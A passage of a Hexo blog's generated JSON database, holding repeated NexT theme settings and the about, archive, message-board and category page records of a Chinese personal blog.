:true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}],"Page":[{"title":"关于本站","date":"2019-07-27T08:37:03.012Z","updated":"2019-07-27T08:37:03.012Z","type":"about","comments":0,"_content":"\n# 个人简介\n* 姓名：保密\n* 性别：男\n* 星座：金牛座\n* 出生日期：1999/05/08\n\n# 个人喜好\n* 喜欢的游戏: ***Minecraft***\n* 喜欢的小说: 《三体》\n* 喜欢的风景: 星空\n* 喜欢的人: 你\n","source":"about/index.md","raw":"---\ntitle: 关于本站\ndate:\nupdated:\ntype: \"about\"\ncomments: false\n---\n\n# 个人简介\n* 姓名：保密\n* 性别：男\n* 星座：金牛座\n* 出生日期：1999/05/08\n\n# 个人喜好\n* 喜欢的游戏: ***Minecraft***\n* 喜欢的小说: 《三体》\n* 喜欢的风景: 星空\n* 喜欢的人: 你\n","path":"about/index.html","layout":"page","_id":"ckieexk9v0000qse5hbs1c2xh","content":"<h1 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h1><ul>\n<li>姓名：保密</li>\n<li>性别：男</li>\n<li>星座：金牛座</li>\n<li>出生日期：1999/05/08</li>\n</ul>\n<h1 id=\"个人喜好\"><a href=\"#个人喜好\" class=\"headerlink\" title=\"个人喜好\"></a>个人喜好</h1><ul>\n<li>喜欢的游戏: <strong><em>Minecraft</em></strong></li>\n<li>喜欢的小说: 《三体》</li>\n<li>喜欢的风景: 星空</li>\n<li>喜欢的人: 你</li>\n</ul>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":77,"excerpt":"","more":"<h1 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h1><ul>\n<li>姓名：保密</li>\n<li>性别：男</li>\n<li>星座：金牛座</li>\n<li>出生日期：1999/05/08</li>\n</ul>\n<h1 id=\"个人喜好\"><a href=\"#个人喜好\" class=\"headerlink\" title=\"个人喜好\"></a>个人喜好</h1><ul>\n<li>喜欢的游戏: <strong><em>Minecraft</em></strong></li>\n<li>喜欢的小说: 《三体》</li>\n<li>喜欢的风景: 星空</li>\n<li>喜欢的人: 你</li>\n</ul>\n"},{"title":"归档","date":"2018-09-10T00:19:06.000Z","type":"archives","comments":0,"_content":"","source":"archives/index.md","raw":"---\ntitle: 归档\ndate: 2018-09-10 08:19:06\ntype: \"archives\"\ncomments: false\n---\n","updated":"2019-01-02T15:22:07.762Z","path":"archives/index.html","layout":"page","_id":"ckieexka30002qse54w720wlp","content":"","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":0,"excerpt":"","more":""},{"title":"留言板","type":"bbs","_content":"","source":"bbs/index.md","raw":"---\ntitle: 留言板\ntype: \"bbs\"\n---\n","date":"2019-04-09T03:05:49.663Z","updated":"2019-04-09T03:05:49.663Z","path":"bbs/index.html","comments":1,"layout":"page","_id":"ckieexka80006qse56wcf57rf","content":"","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":0,"excerpt":"","more":""},{"title":"分类","date":"2018-09-10T00:12:16.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2018-09-10 08:12:16\ntype: \"categories\"\ncomments: false\n---\n","updated":"2019-01-02T15:21:57.939Z","path":"categories/index.html","layout":"page","_id":"ckieexkaa0008qse5ep7lde8l","content":"","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 